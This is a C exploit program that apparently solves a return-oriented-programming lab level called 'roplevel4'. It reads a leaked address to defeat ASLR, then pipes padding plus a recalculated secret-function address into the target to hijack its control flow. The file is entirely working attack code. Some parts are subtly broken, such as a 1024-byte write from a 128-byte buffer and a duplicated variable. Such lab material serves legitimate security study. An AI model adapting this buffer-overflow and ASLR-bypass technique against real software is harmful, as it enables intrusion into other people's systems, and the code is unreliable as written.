#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>

int main () {
	int leakMeStringAddress   = 0x56558424;
	int secretFunctionAddress = 0x565561fd;
	char exploit[128];
	char padding[128] = "AAAABBBBCCCCDDDDEEEEFFFF";

	int fd[2];
	pid_t pid;
	pipe(fd);
	pid = fork();
	if (pid == 0) {
		close(fd[1]);
		dup2(fd[0],0);
		execv("./roplevel4", NULL);
	}
	printf("[*] Generating leaked address and storing it into leak.txt\n");
	sleep(2);

	printf("[*] Reading leaked address... \n");
	sleep(2);

	char readData[64];
	FILE *f = fopen("leak.txt", "a+");
	
	if (NULL == f) {
		printf("[*] Cannot find leak.txt\n");
	} else {
		printf("[*] Found leak.txt!\n");
		char readData[64];
		while (fgets(readData, 64, f) != NULL) {
			printf("[*] leak.txt contains: %s\n", readData);
			
			int addr;
			sscanf(readData, "%x", &addr);
			printf("[*} Leaked address (from readData) is %x\n",addr);
			printf("[*] leakme string address is %x\n",leakMeStringAddress);
			int aslrOffset = addr - leakMeStringAddress;
			printf("[*] ASLR offset is %x\n",aslrOffset);
			
			secretFunctionAddress = secretFunctionAddress + aslrOffset;
			printf("[*] Crafting exploit payload...\n");

			unsigned int one = secretFunctionAddress & 0xff;
			unsigned int two = (secretFunctionAddress>>8) & 0xff;
			unsigned int three = (secretFunctionAddress>>16) & 0xff;
			sprintf(exploit,"%s%c%c%c",padding,one,two,three);

			close(fd[0]);
			write(fd[1],exploit,1024);
		}
	}
	
	fclose(f);
	return 0;
	
}
